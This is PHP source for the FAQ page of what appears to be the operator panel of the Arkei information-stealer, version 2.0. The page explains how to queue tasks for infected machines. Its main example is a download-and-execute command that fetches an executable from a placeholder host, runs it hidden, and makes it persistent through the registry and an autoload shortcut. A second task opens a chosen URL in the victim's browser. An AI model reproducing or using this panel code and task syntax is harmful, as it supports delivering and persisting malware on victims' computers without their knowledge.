<?php
/*
	FAQ Page
*/

session_start();
error_reporting(0);

require("app/config.php");

if($config["db_server"] == null)
{
	header('Location: http://'. $_SERVER["HTTP_HOST"] .'/install');
	exit(0);
}

if($_SESSION["auth"] != true)
{
	header( 'Location: http://'. $config["server_addr"] .'/auth', true, 301 );
}


?>

<!doctype html>
<html lang="en-us">
<head>
	<meta charset="utf-8">
	<meta http-equiv="x-ua-compatible" content="ie=edge">
	<title>FAQ | Arkei</title>
	<meta name="viewport" content="width=device-width, initial-scale=1">
	
	<link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,400i,600" rel="stylesheet">
	
	<link rel="apple-touch-icon" href="apple-touch-icon.png">
	<link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
	
	<link rel="stylesheet" href="css/main.min.css">
</head>
<body>
	<div class="c-toolbar u-mb-medium">
		<h3 class="c-toolbar__title has-divider">Profiles</h3>
		<h5 class="c-toolbar__meta u-mr-auto">Arkei v2.0 | Develop by <a href="https://t.me/foxovsky">@foxovsky</a></h5>
		
		<a href="/index"><button type="button" class="c-btn c-btn--info u-ml-small" >Logs</button></a>	
		<a href="/profiles"><button type="button" class="c-btn c-btn--info u-ml-small" >Profiles</button></a>	
		<a href="/settings"><button type="button" class="c-btn c-btn--success u-ml-small" >Settings</button></a>	
		
	</div>
	
	<div class="col-sm-9 u-ml-auto u-mr-auto">
        <section class="c-article-section">
            <h1 class="u-mb-large">How to use Tasks</h1>
			
			<h4>Example Download&Execute Script</h4>
			<p class="u-mb-medium u-h5 u-text-mute">This task download all type file from remote server, save to input directory, execute file, add this to startup from regedit and create autoload shortcut.</p>
			
			<code style="padding: 4px 5px; border-radius: 4px; background-color: #EFF3F6; color: #df5000; font-family: $code-font-family; font-size: 16px;">install;http://yourdomain.com/file.exe;file.exe;run;hide;add_to_regedit;create_autoload_shortcut;</code>
			<br>
			<br>
			<table class="c-table u-mb-small">
				<thead class="c-table__head c-table__head--slim">
					<tr class="c-table__row">
						<th class="c-table__cell c-table__cell--head u-border-right">Param</th>
						<th class="c-table__cell c-table__cell--head">Description</th>
					</tr>
				</thead>
				
				<tbody>
					<tr class="c-table__row">
						<td class="c-table__cell u-border-right">
							<code class="c-code">install</code>
						</td>
						<td class="c-table__cell">Task type</td>
					</tr>
					
					<tr class="c-table__row">
						<td class="c-table__cell u-border-right">
							<code class="c-code">http://yourdomain.com/file.exe</code>
						</td>
						<td class="c-table__cell">Full path to file in web</td>
					</tr>
					
					<tr class="c-table__row">
						<td class="c-table__cell u-border-right">
							<code class="c-code">file.exe</code>
						</td>
						<td class="c-table__cell">File name to save in PC</td>
					</tr>
					
					<tr class="c-table__row">
						<td class="c-table__cell u-border-right">
							<code class="c-code">run / drop</code>
						</td>
						<td class="c-table__cell">run - run after download, drop - none</td>
					</tr>
					
					<tr class="c-table__row">
						<td class="c-table__cell u-border-right">
							<code class="c-code">hide / show</code>
						</td>
						<td class="c-table__cell">hide - run app hide, show - rin app show</td>
					</tr>
					
					<tr class="c-table__row">
						<td class="c-table__cell u-border-right">
							<code class="c-code">add_to_regedit / drop</code>
						</td>
						<td class="c-table__cell">add_to_regedit - add to autoload current user, drop - none</td>
					</tr>
					
					<tr class="c-table__row">
						<td class="c-table__cell u-border-right">
							<code class="c-code">create_autoload_shortcut / drop</code>
						</td>
						<td class="c-table__cell">create_autoload_shortcut - create autoload shortcut for current user, drop - none</td>
					</tr>
					
                </tbody>
            </table>
			
			<h4>Example Open URL Script</h4>
			<p class="u-mb-medium u-h5 u-text-mute">This task opening your URL in default system browser.</p>
			
			<code style="padding: 4px 5px; border-radius: 4px; background-color: #EFF3F6; color: #df5000; font-family: $code-font-family; font-size: 16px;">open_url;https://google.com</code>
			<br>
			<br>
			
			<table class="c-table u-mb-small">
				<thead class="c-table__head c-table__head--slim">
					<tr class="c-table__row">
						<th class="c-table__cell c-table__cell--head u-border-right">Param</th>
						<th class="c-table__cell c-table__cell--head">Description</th>
					</tr>
				</thead>
				
				<tbody>
					<tr class="c-table__row">
						<td class="c-table__cell u-border-right">
							<code class="c-code">open_url</code>
						</td>
						<td class="c-table__cell">Task type</td>
					</tr>
					
					<tr class="c-table__row">
						<td class="c-table__cell u-border-right">
							<code class="c-code">https://google.com</code>
						</td>
						<td class="c-table__cell">Your URL to open in browser</td>
					</tr>
					
                </tbody>
            </table>
			
			
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			
        </section>
	</div>
</div>
    </body>
</html>